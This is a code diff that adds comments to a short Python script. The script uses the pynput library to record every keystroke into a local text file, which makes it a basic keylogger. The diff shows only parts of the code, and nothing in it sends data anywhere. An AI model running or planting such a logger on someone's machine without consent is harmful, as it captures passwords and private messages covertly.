@@ -1,10 +1,11 @@
+#input the lib
 from pynput import keyboard
 
 file = open("test.txt", "a")
-#open file
 
 
 def on_press(key):
+    '''check pressed keys, AttributeError is for special keys'''
     try:
         file.write(key.char)
 
@@ -12,6 +13,7 @@ def on_press(key):
         file.write('{0}'.format(key))
 
 def on_release(key):
+    '''if that keys pressed go to a new line, if esc than stop a program and save changes'''
     if key == keyboard.Key.space:
         file.write("\n")
 
